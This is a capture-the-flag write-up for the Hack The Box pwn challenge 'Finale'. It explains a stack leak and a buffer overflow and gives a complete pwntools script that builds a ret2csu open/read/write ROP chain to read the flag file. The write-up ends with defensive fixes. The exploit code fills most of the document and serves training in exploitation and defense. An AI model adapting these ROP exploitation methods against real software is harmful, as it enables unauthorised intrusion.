Finale is an Easy HTB **Pwn** challenge. The flag itself spoils the lesson:
`HTB{wh0_n33d5_l1bc_wh3n_u_h4v3_st4ck_l45k5}` — *who needs libc when you have stack leaks?*
There is no `system`/`execve` and no usable libc leak, so a textbook ret2libc is awkward. But
`open`, `read`, and `write` are all in the PLT, so we ROP a self-contained open→read→write of the
flag file with no libc base at all.

## Overview

A 64-bit binary compiled `No-PIE / NX / Full-RELRO / no-canary`. A gate function checks a hardcoded
secret phrase; passing it reaches `finale()`, which has a [stack buffer overflow](https://cwe.mitre.org/data/definitions/121.html).
With No-PIE every gadget/PLT/GOT address is fixed at `0x400000`, and a free `%p` leak hands us a
stack address — exactly the two ingredients needed for a no-libc ORW chain.

## The technique

```
Arch:     amd64    RELRO: Full    Stack: No canary    NX: enabled    PIE: No (0x400000)
```

Two functions matter:

- `main()` — `scanf("%16s")` then `strncmp(buf, "s34s0nf1n4l3b00", 15)`. The secret phrase is just a
  hardcoded `.rodata` string — reverse it and you reach `finale()`.
- `finale()` —
  ```c
  printf("...good luck: [%p]", &buf);   // leaks the STACK ADDRESS of buf
  read(0, buf /* rbp-0x40 */, 0x1000);  // stack BOF, saved-RIP at offset 72
  ```

`rdx` (the size argument for `read`/`write`) has no `pop rdx; ret` gadget. The fix is the universal
`__libc_csu_init` gadget pair:

```
0x401512: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
0x4014f8: mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8]
```

Set `rbx=0, rbp=1` (the init loop runs exactly once and exits), `r12→edi`, `r13→rsi`, `r14→rdx`,
`r15→&GOT[func]`. The post-call epilogue then eats 7 more qwords, so each CSU call is padded with 7
junk qwords.

Three gotchas decide success:

- **CSU only sets `edi` (32-bit).** `mov edi, r12d` zero-extends, so CSU can pass a 32-bit address
  but **not** a 64-bit stack pointer. `open`'s filename is a stack address, so `rdi` for `open` is
  set with a plain `pop rdi; ret` instead.
- **`open`'s own frame clobbers `buf[0]`.** Put `"flag.txt"` at the *start* of the buffer and
  `open()`'s prologue grows the stack *below* `rsp` (~`buf+0x70` at the call), overwriting it before
  the `openat` syscall reads the path. The fix: place the filename at the **end** of the payload,
  which stays *above* `rsp` for the whole chain.
- **`socat` shifts the fd.** Under `socat TCP-LISTEN,fork EXEC:'./finale'`, the child inherits extra
  open fds (3 and 4), so `open("flag.txt")` returns **fd 5** remotely (it is 3 when run locally), and
  reading a leftover socket fd *blocks*. Reading candidate fds in the order `5,6,7,8,3` emits the
  flag before the chain ever touches a blocking fd.

## Solution

`solve.py` — reverse the phrase, leak the stack address, then ret2csu ORW the flag file:

```python
#!/usr/bin/env python3
import sys, re
from pwn import *

context.binary = elf = ELF('./files/challenge/finale', checksec=False)

PHRASE = b's34s0nf1n4l3b00'   # strncmp target @ 0x40299d
OFF    = 72                   # buf(rbp-0x40) -> saved RIP

POP_RDI  = 0x4011f2   # pop rdi; ret  (full 64-bit -> stack filename ptr)
POP_RSI  = 0x4011f4   # pop rsi; ret
OPEN_PLT = 0x4010e0   # open@plt
POP6     = 0x401512   # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
CSU_CALL = 0x4014f8   # mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8]
READ_GOT  = 0x403250
WRITE_GOT = 0x403230
DATA = 0x404600       # scratch in the RW page for the flag bytes

def csu(got, a, b, c):
    return (p64(POP6) + p64(0) + p64(1) + p64(a) + p64(b) + p64(c) + p64(got)
            + p64(CSU_CALL) + b'B' * 0x38)   # 0x38 = post-call epilogue padding

io = remote(sys.argv[1], int(sys.argv[2])) if len(sys.argv) >= 3 else process(elf.path)
io.sendlineafter(b'secret phrase: ', PHRASE)        # pass strncmp -> finale()

io.recvuntil(b'good luck: [')                       # souvenir leak = &buf
buf_addr = int(io.recvuntil(b']', drop=True), 16)
io.recvuntil(b'wish for next year: ')

rop  = p64(POP_RDI) + p64(0)            # name_addr patched in once layout is known
rop += p64(POP_RSI) + p64(0)
rop += p64(OPEN_PLT)                    # open(name, 0)
for fd in (5, 6, 7, 8, 3):             # socat fd-shift + block-safe order
    rop += csu(READ_GOT,  fd, DATA, 100)
    rop += csu(WRITE_GOT, 1,  DATA, 100)

name_addr = buf_addr + OFF + len(rop)   # filename lives at the payload END (above rsp)
rop = rop.replace(p64(POP_RDI) + p64(0), p64(POP_RDI) + p64(name_addr), 1)

io.send(b'A' * OFF + rop + b'flag.txt\x00')
data = io.recvall(timeout=5)
m = re.search(rb'HTB\{[^}]*\}', data)
if m:
    log.success('FLAG: ' + m.group().decode())
```

Running it against the live instance prints the flag:

```bash
python3 solve.py <host> <port>
# [+] FLAG: HTB{...}
```

## Why it worked

The author handed us a free **stack-address leak** via `%p`. With No-PIE the code/GOT/PLT addresses
are already fixed, so a stack leak is the only missing ingredient — and it lets us point `open` at a
filename we wrote into our own overflow. ORW via the PLT sidesteps the absence of `system` and any
libc-version guessing entirely.

## Fix / defense

- Never print raw pointers — `%p` of a stack address is an ASLR/stack-leak primitive.
- Bound the read: `read(0, buf, sizeof buf)` instead of `0x1000` into a `0x40` buffer.
- Compile with a stack canary and **PIE** (PIE would have forced a code leak the binary never
  provides). `_FORTIFY_SOURCE` would also catch the oversized read.
